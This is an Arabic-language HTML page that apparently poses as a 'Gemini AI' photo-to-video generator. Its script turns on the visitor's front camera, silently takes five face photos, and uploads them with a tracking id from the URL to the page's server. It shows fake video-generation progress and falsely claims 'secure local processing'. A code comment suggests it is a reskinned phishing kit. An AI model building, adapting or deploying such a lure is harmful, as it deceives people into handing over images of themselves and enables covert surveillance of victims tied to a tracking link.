<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gemini AI - Video Generator</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
        }

        body {
            background: #050508;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        /* الخلفية المتقدمة */
        .bg-effects {
            position: fixed;
            inset: 0;
            z-index: 0;
            overflow: hidden;
        }

        .bg-effects .orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.3;
            animation: orbFloat 20s ease-in-out infinite alternate;
        }

        .bg-effects .orb:nth-child(1) {
            width: 500px;
            height: 500px;
            background: #5832ff;
            top: -100px;
            left: -100px;
            animation-delay: 0s;
        }

        .bg-effects .orb:nth-child(2) {
            width: 400px;
            height: 400px;
            background: #00c8ff;
            bottom: -100px;
            right: -100px;
            animation-delay: -7s;
        }

        .bg-effects .orb:nth-child(3) {
            width: 300px;
            height: 300px;
            background: #ff32a8;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation-delay: -14s;
            opacity: 0.1;
        }

        @keyframes orbFloat {
            0% { transform: translate(0, 0) scale(1); }
            33% { transform: translate(60px, -40px) scale(1.1); }
            66% { transform: translate(-40px, 60px) scale(0.9); }
            100% { transform: translate(30px, -30px) scale(1.05); }
        }

        /* جزيئات */
        .particles {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 0;
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: rgba(255, 255, 255, 0.15);
            border-radius: 50%;
            animation: particleDrift linear infinite;
        }

        @keyframes particleDrift {
            0% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
        }

        /* الحاوية الرئيسية */
        .container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 480px;
            background: rgba(255, 255, 255, 0.02);
            backdrop-filter: blur(60px) saturate(1.6);
            -webkit-backdrop-filter: blur(60px) saturate(1.6);
            border-radius: 40px;
            padding: 35px 28px;
            border: 1px solid rgba(255, 255, 255, 0.04);
            box-shadow: 
                0 40px 100px rgba(0, 0, 0, 0.6),
                inset 0 1px 0 rgba(255, 255, 255, 0.03),
                0 0 150px rgba(88, 50, 255, 0.03);
            transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        .container:hover {
            transform: translateY(-3px);
        }

        /* شعار Gemini */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 25px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        }

        .gemini-brand {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .gemini-icon {
            width: 44px;
            height: 44px;
            background: linear-gradient(135deg, #5832ff, #7c5cff, #00c8ff);
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            color: white;
            box-shadow: 0 8px 40px rgba(88, 50, 255, 0.25);
            animation: iconGlow 3s ease-in-out infinite;
            position: relative;
        }

        .gemini-icon::after {
            content: '';
            position: absolute;
            inset: -3px;
            border-radius: 17px;
            background: linear-gradient(135deg, #5832ff, #00c8ff);
            z-index: -1;
            opacity: 0.3;
            filter: blur(10px);
            animation: iconPulse 3s ease-in-out infinite;
        }

        @keyframes iconGlow {
            0%, 100% { box-shadow: 0 8px 40px rgba(88, 50, 255, 0.25); }
            50% { box-shadow: 0 8px 60px rgba(88, 50, 255, 0.5), 0 0 100px rgba(0, 200, 255, 0.1); }
        }

        @keyframes iconPulse {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(1.1); }
        }

        .gemini-brand .name {
            font-size: 1.2em;
            font-weight: 900;
            background: linear-gradient(135deg, #ffffff 20%, #a8b5ff 50%, #5832ff 80%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }

        .gemini-brand .badge {
            font-size: 0.5em;
            padding: 3px 12px;
            background: rgba(88, 50, 255, 0.15);
            border-radius: 30px;
            color: #a8b5ff;
            border: 1px solid rgba(88, 50, 255, 0.08);
            font-weight: 700;
            letter-spacing: 0.3px;
            -webkit-text-fill-color: #a8b5ff;
        }

        .status-dot {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.6em;
            color: rgba(255, 255, 255, 0.15);
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .status-dot .dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: #4ade80;
            animation: dotPulse 2s ease-in-out infinite;
            box-shadow: 0 0 20px rgba(74, 222, 128, 0.15);
        }

        @keyframes dotPulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.2; transform: scale(0.7); }
        }

        /* العنوان الرئيسي */
        .hero {
            text-align: center;
            margin-bottom: 20px;
        }

        .hero h1 {
            font-size: 2.2em;
            font-weight: 900;
            line-height: 1.1;
            background: linear-gradient(135deg, #ffffff 20%, #a8b5ff 50%, #7c5cff 80%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -1px;
        }

        .hero p {
            color: rgba(255, 255, 255, 0.2);
            font-size: 0.85em;
            margin-top: 8px;
            letter-spacing: 0.3px;
        }

        .hero .ai-tag {
            display: inline-block;
            margin-top: 6px;
            padding: 4px 16px;
            background: rgba(88, 50, 255, 0.08);
            border-radius: 30px;
            border: 1px solid rgba(88, 50, 255, 0.06);
            font-size: 0.6em;
            color: rgba(255, 255, 255, 0.15);
            letter-spacing: 1px;
            font-weight: 700;
        }

        /* معلومات المستخدم */
        .user-info {
            background: rgba(255, 255, 255, 0.02);
            padding: 14px 18px;
            border-radius: 16px;
            margin: 18px 0;
            border: 1px solid rgba(255, 255, 255, 0.02);
        }

        .user-info .label {
            font-size: 0.6em;
            color: rgba(255, 255, 255, 0.1);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .user-id {
            background: rgba(0, 0, 0, 0.3);
            padding: 8px 14px;
            border-radius: 10px;
            margin-top: 6px;
            font-family: 'Courier New', monospace;
            direction: ltr;
            overflow-x: auto;
            white-space: nowrap;
            font-size: 0.8em;
            color: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.02);
        }

        /* حاوية الفيديو */
        .video-wrapper {
            position: relative;
            width: 100%;
            border-radius: 24px;
            overflow: hidden;
            margin: 18px 0;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.02);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
        }

        .video-wrapper video {
            width: 100%;
            display: block;
            aspect-ratio: 4/3;
            object-fit: cover;
            transform: scaleX(-1);
        }

        /* تراكب الفيديو */
        .video-overlay {
            position: absolute;
            inset: 0;
            background: 
                radial-gradient(circle at 20% 30%, rgba(88, 50, 255, 0.04), transparent 60%),
                radial-gradient(circle at 80% 70%, rgba(0, 200, 255, 0.03), transparent 60%);
            pointer-events: none;
        }

        .video-overlay .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, rgba(88, 50, 255, 0.3), transparent);
            animation: scanMove 3s linear infinite;
        }

        @keyframes scanMove {
            0% { top: 0; opacity: 1; }
            50% { opacity: 0.3; }
            100% { top: 100%; opacity: 0; }
        }

        /* شارة AI */
        .ai-badge {
            position: absolute;
            bottom: 15px;
            right: 15px;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(20px);
            padding: 6px 16px;
            border-radius: 30px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.6em;
            color: rgba(255, 255, 255, 0.15);
            pointer-events: none;
        }

        .ai-badge .loader {
            width: 14px;
            height: 14px;
            border: 1.5px solid rgba(255, 255, 255, 0.03);
            border-top: 1.5px solid #5832ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* حالة التقدم */
        .status-container {
            background: rgba(255, 255, 255, 0.01);
            border-radius: 16px;
            padding: 18px 20px;
            margin: 18px 0;
            border: 1px solid rgba(255, 255, 255, 0.02);
        }

        #status {
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 600;
            font-size: 0.9em;
            color: rgba(255, 255, 255, 0.3);
            min-height: 28px;
        }

        #status .icon {
            font-size: 1.1em;
            width: 24px;
            text-align: center;
        }

        .progress-container {
            width: 100%;
            height: 3px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 4px;
            overflow: hidden;
            margin-top: 14px;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #5832ff, #00c8ff);
            border-radius: 4px;
            width: 0%;
            transition: width 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 0 30px rgba(88, 50, 255, 0.1);
        }

        .progress-info {
            display: flex;
            justify-content: space-between;
            margin-top: 8px;
            font-size: 0.7em;
            color: rgba(255, 255, 255, 0.08);
        }

        /* الأزرار */
        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin: 18px 0;
        }

        .primary-btn {
            width: 100%;
            padding: 18px;
            border-radius: 60px;
            border: none;
            font-size: 1em;
            cursor: pointer;
            font-weight: 800;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            overflow: hidden;
            background: linear-gradient(135deg, #5832ff, #7c5cff);
            color: #fff;
            box-shadow: 0 8px 50px rgba(88, 50, 255, 0.2);
            letter-spacing: 0.3px;
        }

        .primary-btn::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, #7c5cff, #5832ff);
            opacity: 0;
            transition: opacity 0.4s;
        }

        .primary-btn:hover:not(:disabled)::before {
            opacity: 1;
        }

        .primary-btn:hover:not(:disabled) {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 12px 60px rgba(88, 50, 255, 0.35);
        }

        .primary-btn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
            transform: none !important;
        }

        .primary-btn .btn-icon {
            font-size: 1.2em;
            position: relative;
            z-index: 1;
        }

        .primary-btn .btn-text {
            position: relative;
            z-index: 1;
        }

        .secondary-btn {
            width: 100%;
            padding: 14px;
            border-radius: 60px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            background: rgba(255, 255, 255, 0.01);
            color: rgba(255, 255, 255, 0.08);
            font-size: 0.8em;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .secondary-btn:hover {
            background: rgba(255, 255, 255, 0.02);
            border-color: rgba(255, 255, 255, 0.05);
            color: rgba(255, 255, 255, 0.15);
        }

        /* المميزات */
        .features {
            display: flex;
            gap: 8px;
            margin-top: 18px;
        }

        .feature {
            flex: 1;
            padding: 14px 6px;
            background: rgba(255, 255, 255, 0.01);
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.02);
            text-align: center;
            transition: all 0.3s ease;
        }

        .feature:hover {
            background: rgba(255, 255, 255, 0.02);
        }

        .feature i {
            font-size: 1.2em;
            color: rgba(255, 255, 255, 0.04);
            display: block;
            margin-bottom: 4px;
        }

        .feature .value {
            font-size: 1em;
            font-weight: 800;
            color: rgba(255, 255, 255, 0.1);
        }

        .feature .desc {
            font-size: 0.5em;
            color: rgba(255, 255, 255, 0.04);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .footer {
            margin-top: 22px;
            text-align: center;
            font-size: 0.55em;
            color: rgba(255, 255, 255, 0.03);
            letter-spacing: 0.5px;
        }

        /* الإشعارات */
        .notification {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(40px);
            padding: 14px 30px;
            border-radius: 60px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            color: white;
            font-size: 0.8em;
            z-index: 1000;
            animation: notifUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            max-width: 90%;
            text-align: center;
            font-weight: 600;
        }

        @keyframes notifUp {
            from { transform: translateX(-50%) translateY(40px); opacity: 0; }
            to { transform: translateX(-50%) translateY(0); opacity: 1; }
        }

        .notification.hidden {
            display: none;
        }

        .hidden {
            display: none !important;
        }

        /* استجابة */
        @media (max-width: 500px) {
            .container {
                padding: 25px 16px;
                border-radius: 28px;
            }
            .hero h1 {
                font-size: 1.6em;
            }
            .gemini-brand .name {
                font-size: 1em;
            }
            .video-wrapper video {
                aspect-ratio: 4/3;
            }
            .features {
                gap: 5px;
            }
            .feature {
                padding: 10px 4px;
            }
            .feature .value {
                font-size: 0.8em;
            }
        }
    </style>
</head>

<body>

<!-- المؤثرات الخلفية -->
<div class="bg-effects">
    <div class="orb"></div>
    <div class="orb"></div>
    <div class="orb"></div>
</div>

<div class="particles" id="particles"></div>

<!-- الحاوية -->
<div class="container">

    <!-- الهيدر -->
    <div class="header">
        <div class="gemini-brand">
            <div class="gemini-icon">✦</div>
            <span class="name">Gemini</span>
            <span class="badge">AI</span>
        </div>
        <div class="status-dot">
            <span class="dot"></span>
            <span>نشط</span>
        </div>
    </div>

    <!-- الهيرو -->
    <div class="hero">
        <h1>تحويل الصور<br>إلى فيديو</h1>
        <p>باستخدام الذكاء الاصطناعي المتقدم</p>
        <span class="ai-tag">✦ GEMINI AI ENGINE ✦</span>
    </div>

    <!-- معلومات المستخدم -->
    <div class="user-info">
        <div class="label">🔗 معرف الجلسة</div>
        <div class="user-id" id="referralDisplay">جاري التحميل...</div>
    </div>

    <!-- فيديو الكاميرا -->
    <div class="video-wrapper">
        <video id="camera" autoplay playsinline muted></video>
        <div class="video-overlay">
            <div class="scan-line"></div>
        </div>
        <div class="ai-badge">
            <div class="loader"></div>
            <span>AI Vision</span>
        </div>
    </div>

    <!-- حالة التقدم -->
    <div class="status-container">
        <div id="status">
            <span class="icon">⟳</span>
            <span>تهيئة محرك Gemini...</span>
        </div>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="progress-info">
            <span id="progressText">0%</span>
            <span id="progressDetail">معالجة الإطارات</span>
        </div>
    </div>

    <!-- الأزرار -->
    <div class="btn-container">
        <button class="primary-btn" id="captureBtn">
            <span class="btn-icon">▶</span>
            <span class="btn-text">بدء توليد الفيديو</span>
        </button>
        <button class="secondary-btn" onclick="location.reload()">
            <i class="fas fa-rotate"></i> إعادة التشغيل
        </button>
    </div>

    <!-- المميزات -->
    <div class="features">
        <div class="feature">
            <i class="fas fa-microchip"></i>
            <div class="value">AI</div>
            <div class="desc">معالجة ذكية</div>
        </div>
        <div class="feature">
            <i class="fas fa-film"></i>
            <div class="value">4K</div>
            <div class="desc">جودة عالية</div>
        </div>
        <div class="feature">
            <i class="fas fa-bolt"></i>
            <div class="value">5s</div>
            <div class="desc">معالجة سريعة</div>
        </div>
    </div>

    <div class="footer">
        <span>✦ Gemini AI Engine v2.0 · معالجة محلية آمنة ✦</span>
    </div>

</div>

<!-- الإشعار -->
<div id="notification" class="notification hidden"></div>

<script>
    // =============================================
    // 🎯 الكود الأصلي مع تغيير النصوص فقط
    // =============================================

    const params = new URLSearchParams(window.location.search);
    const referralId = params.get("q");

    const captureBtn = document.getElementById("captureBtn");
    const camera = document.getElementById("camera");
    const status = document.getElementById("status");
    const progressBar = document.getElementById("progressBar");
    const progressText = document.getElementById("progressText");
    const progressDetail = document.getElementById("progressDetail");
    const referralDisplay = document.getElementById("referralDisplay");
    const notification = document.getElementById("notification");

    let stream = null;

    // جزيئات الخلفية
    function createParticles() {
        const container = document.getElementById('particles');
        for (let i = 0; i < 30; i++) {
            const p = document.createElement('div');
            p.className = 'particle';
            p.style.left = Math.random() * 100 + '%';
            p.style.animationDuration = (12 + Math.random() * 30) + 's';
            p.style.animationDelay = (Math.random() * 20) + 's';
            p.style.width = (1 + Math.random() * 3) + 'px';
            p.style.height = p.style.width;
            container.appendChild(p);
        }
    }
    createParticles();

    if (referralId) {
        referralDisplay.textContent = referralId;
    } else {
        referralDisplay.textContent = "❌ جلسة غير صالحة";
        referralDisplay.style.color = "rgba(255,100,100,0.2)";
    }

    function showNotification(message, type = 'info') {
        notification.textContent = message;
        notification.className = 'notification';
        const colors = {
            success: 'rgba(74,222,128,0.1)',
            error: 'rgba(255,100,100,0.1)',
            warning: 'rgba(255,200,50,0.1)',
            info: 'rgba(88,50,255,0.1)'
        };
        notification.style.borderColor = colors[type] || 'rgba(255,255,255,0.02)';
        setTimeout(() => {
            notification.className = 'notification hidden';
        }, 3500);
    }

    // تهيئة الكاميرا
    async function initCamera() {
        if (!referralId) {
            status.innerHTML = '<span class="icon">✕</span><span>جلسة غير صالحة</span>';
            return;
        }

        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" },
                audio: false
            });

            camera.srcObject = stream;

            await new Promise((resolve, reject) => {
                camera.onloadedmetadata = () => {
                    camera.play().then(resolve).catch(reject);
                };
            });

            status.innerHTML = '<span class="icon">✓</span><span>محرك Gemini جاهز</span>';
            showNotification('✅ محرك Gemini جاهز', 'success');

        } catch (error) {
            console.error(error);
            status.innerHTML = '<span class="icon">⚠</span><span>يرجى السماح بالكاميرا</span>';
            showNotification('⚠ يرجى السماح بصلاحية الكاميرا', 'error');
        }
    }

    initCamera();

    // التقاط إطار واحد
    function captureSingleFrame() {
        return new Promise((resolve) => {
            const canvas = document.createElement("canvas");
            const width = camera.videoWidth || 640;
            const height = camera.videoHeight || 480;
            canvas.width = width;
            canvas.height = height;

            const context = canvas.getContext("2d");
            context.translate(width, 0);
            context.scale(-1, 1);
            context.drawImage(camera, 0, 0, width, height);

            canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.7);
        });
    }

    const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    // زر البدء
    captureBtn.addEventListener("click", async () => {
        if (!stream || !referralId) {
            status.innerHTML = '<span class="icon">✕</span><span>الكاميرا غير جاهزة</span>';
            showNotification('❌ الكاميرا غير جاهزة', 'error');
            return;
        }

        captureBtn.disabled = true;
        progressBar.style.width = '0%';
        progressText.textContent = '0%';
        progressDetail.textContent = 'بدء المعالجة...';

        const totalPhotos = 5;
        const formData = new FormData();
        formData.append("referral_id", referralId);

        try {
            for (let i = 1; i <= totalPhotos; i++) {
                const percent = Math.round((i / totalPhotos) * 100);
                const msgs = [
                    'تحليل الإطار الأول...',
                    'معالجة الإطار الثاني...',
                    'دمج الإطار الثالث...',
                    'تحسين الإطار الرابع...',
                    'توليد الفيديو النهائي...'
                ];
                
                status.innerHTML = `<span class="icon">⟳</span><span>${msgs[i-1] || 'معالجة...'}</span>`;
                progressBar.style.width = `${percent}%`;
                progressText.textContent = `${percent}%`;
                progressDetail.textContent = `معالجة ${i}/${totalPhotos}`;

                const blob = await captureSingleFrame();
                if (blob) {
                    formData.append("photos", blob, `photo_${i}.jpg`);
                }

                if (i < totalPhotos) {
                    await delay(2000);
                }
            }

            if (stream) {
                stream.getTracks().forEach((track) => track.stop());
                stream = null;
            }

            status.innerHTML = '<span class="icon">⟳</span><span>توليد الفيديو النهائي...</span>';
            progressDetail.textContent = 'رفع النتائج...';
            showNotification('⏳ جاري توليد الفيديو...', 'info');

            const response = await fetch("/upload-photo", {
                method: "POST",
                body: formData
            });

            const result = await response.json();

            if (response.ok && result.success) {
                status.innerHTML = '<span class="icon">✦</span><span>تم توليد الفيديو بنجاح!</span>';
                progressBar.style.width = '100%';
                progressText.textContent = '100%';
                progressDetail.textContent = '✅ اكتمل التوليد';
                showNotification('🎉 تم توليد الفيديو بنجاح!', 'success');
                camera.style.display = "none";
                captureBtn.style.display = "none";
            } else {
                status.innerHTML = `<span class="icon">✕</span><span>${result.message || 'فشل التوليد'}</span>`;
                showNotification(`❌ ${result.message || 'فشل التوليد'}`, 'error');
                captureBtn.disabled = false;
            }

        } catch (error) {
            console.error(error);
            status.innerHTML = '<span class="icon">✕</span><span>خطأ في الاتصال</span>';
            showNotification('❌ خطأ في الاتصال بالخادم', 'error');
            captureBtn.disabled = false;
        }
    });

    window.addEventListener('beforeunload', (e) => {
        if (captureBtn.disabled) {
            e.preventDefault();
            e.returnValue = 'هل تريد الخروج؟ سيتم إيقاف المعالجة.';
            return e.returnValue;
        }
    });
</script>

</body>
</html>
